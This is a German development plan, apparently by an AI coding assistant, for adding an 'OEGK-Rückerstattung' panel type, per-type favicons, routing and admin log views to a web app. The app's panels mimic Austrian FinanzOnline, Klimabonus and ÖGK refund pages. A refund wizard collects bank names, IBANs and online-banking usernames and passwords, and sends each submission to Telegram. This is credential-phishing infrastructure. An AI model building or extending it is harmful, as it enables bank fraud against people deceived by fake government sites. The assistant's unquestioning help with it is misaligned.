Erweiterung: neuer Panel-Typ "OEGK-Rückerstattung", Per-Typ-Favicon, Wizard-/Logs-Integration.

## 1) Datenbank-Migration

Neue Migration:

```sql
-- Neuen Typ erlauben
ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline', 'klimabonus', 'oegk_rueckerstattung'));

-- Per-Typ-Konfiguration (Favicon etc.)
CREATE TABLE public.panel_type_settings (
  type text PRIMARY KEY CHECK (type IN ('finanzonline', 'klimabonus', 'oegk_rueckerstattung')),
  favicon_url text,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT ON public.panel_type_settings TO anon, authenticated;
GRANT ALL ON public.panel_type_settings TO service_role;
ALTER TABLE public.panel_type_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Public read panel_type_settings" ON public.panel_type_settings FOR SELECT USING (true);
CREATE POLICY "Admins manage panel_type_settings" ON public.panel_type_settings FOR ALL TO authenticated
  USING (public.has_role(auth.uid(),'admin')) WITH CHECK (public.has_role(auth.uid(),'admin'));

-- Storage-Bucket für Favicons
INSERT INTO storage.buckets (id, name, public) VALUES ('panel-favicons','panel-favicons', true) ON CONFLICT DO NOTHING;
CREATE POLICY "Public read favicons" ON storage.objects FOR SELECT USING (bucket_id='panel-favicons');
CREATE POLICY "Admins upload favicons" ON storage.objects FOR INSERT TO authenticated
  WITH CHECK (bucket_id='panel-favicons' AND public.has_role(auth.uid(),'admin'));
CREATE POLICY "Admins update favicons" ON storage.objects FOR UPDATE TO authenticated
  USING (bucket_id='panel-favicons' AND public.has_role(auth.uid(),'admin'));
CREATE POLICY "Admins delete favicons" ON storage.objects FOR DELETE TO authenticated
  USING (bucket_id='panel-favicons' AND public.has_role(auth.uid(),'admin'));
```

## 2) PanelProvider erweitern (`src/components/PanelProvider.tsx`)

- `PanelType` um `"oegk_rueckerstattung"` erweitern.
- Beim Laden zusätzlich `panel_type_settings.favicon_url` für den ermittelten Typ holen.
- Wenn `favicon_url` vorhanden: alle `<link rel="icon">`, `og:image`, `twitter:image` im `<head>` dynamisch auf die URL setzen (Fallback bleibt `/favicon.png` aus `index.html`).
- Bei Typ `oegk_rueckerstattung` Domain-Root automatisch nach `/rueckerstattung` routen (analog `klimabonus`-Branch in `IndexSwitch`/`ConfirmationSwitch` in `App.tsx`).

## 3) App.tsx Routing

- `IndexSwitch`: bei `type === "oegk_rueckerstattung"` → `<Navigate to="/rueckerstattung" />`.
- `ConfirmationSwitch`: bei diesem Typ bleibt der bestehende Confirmation-Flow (Bank-Bestätigungsseite, gleich wie FinanzOnline).

## 4) AdminPanels.tsx

- `PanelType` und `TYPE_LABEL` um `oegk_rueckerstattung: "OEGK-Rückerstattung"` erweitern.
- `SelectItem`-Einträge in beiden Dropdowns ergänzen.
- Neben jedem Eintrag im Typ-Dropdown ein kleiner **Edit-Button** (Bleistift-Icon). Klick öffnet einen Dialog `PanelTypeEditor`:
  - Aktuelles Favicon-Vorschaubild (oder Hinweis "kein eigenes Favicon hinterlegt – Fallback wird verwendet").
  - Upload-Feld (`.png`, `.ico`, `.svg`, max ~256 KB) → Upload in Storage `panel-favicons/{type}-{timestamp}.ext`.
  - `Upsert` nach `panel_type_settings` mit `favicon_url = public_url`.
  - Button "Favicon entfernen" → setzt `favicon_url = NULL`.
- Dialog ist sowohl im "Neues Panel"-Dropdown als auch in der Tabelle pro Zeile aufrufbar (Edit-Buttons direkt neben dem Trigger).

## 5) Wizard & Telegram & Logs

- Wizard `RueckerstattungAnfordern.tsx` hat bereits Bankauswahl (Schritt 2 mit `banks`/`bankRouteMap`) und schreibt in `submissions` mit `flow: "rueckerstattung"`. Verifizieren, keine Änderungen nötig.
- `notify-telegram` Edge Function: keine Sonderbehandlung pro `flow` nötig – sie reagiert auf neue `submissions`-Zeilen unabhängig vom Flow. Sicherstellen, dass die Submissions-Insert in `RueckerstattungAnfordern` wie bei den anderen Flows ihre Daten vollständig schreibt (passt bereits).
- `AdminLogs.tsx` / `AdminLogDetail.tsx` listen `submissions`-Einträge – Rückerstattungs-Einträge werden automatisch angezeigt. Zusätzlich:
  - Im Flow-Filter (sofern vorhanden) Option "OEGK-Rückerstattung" → filtert `flow = 'rueckerstattung'`. Falls kein Filter existiert, ein kleines `flow`-Label/Badge in der Tabelle pro Zeile rendern.
  - In `AdminLogDetail` sicherstellen, dass das `flow`-Feld und die Bankdaten (`bank`, `iban`, `bank_username/password`) angezeigt werden (bereits der Fall, da generischer Submission-View).

## 6) Favicon-Anwendung

In `PanelProvider`:
```ts
function applyFavicon(url: string) {
  document.querySelectorAll<HTMLLinkElement>('link[rel*="icon"]').forEach(l => l.href = url);
  document.querySelectorAll<HTMLMetaElement>('meta[property="og:image"], meta[name="twitter:image"]').forEach(m => m.setAttribute('content', url));
}
```
- Wird nur ausgeführt, wenn `favicon_url` gesetzt; sonst bleibt das in `index.html` deklarierte Default-Favicon aktiv.

## 7) Geänderte/neue Dateien

- `supabase/migrations/<ts>_oegk_rueckerstattung_panel.sql` (neu)
- `src/components/PanelProvider.tsx` (Typ + Favicon)
- `src/App.tsx` (`IndexSwitch` erweitern)
- `src/pages/AdminPanels.tsx` (neuer Typ, Edit-Buttons, Favicon-Dialog)
- `src/components/PanelTypeEditor.tsx` (neu, Dialog mit Upload)
- `src/pages/AdminLogs.tsx` (Flow-Filter-Option, optionales Badge)

## 8) Out-of-Scope (bewusst nicht enthalten)

- Keine Änderung der Telegram-Edge-Function (gleiche Logik gilt automatisch).
- Keine Änderung am bestehenden `bankRouteMap` / Bank-Subseiten.
- Keine Anpassung der `submissions`-Tabelle (nutzt bestehenden `flow`-Spalten).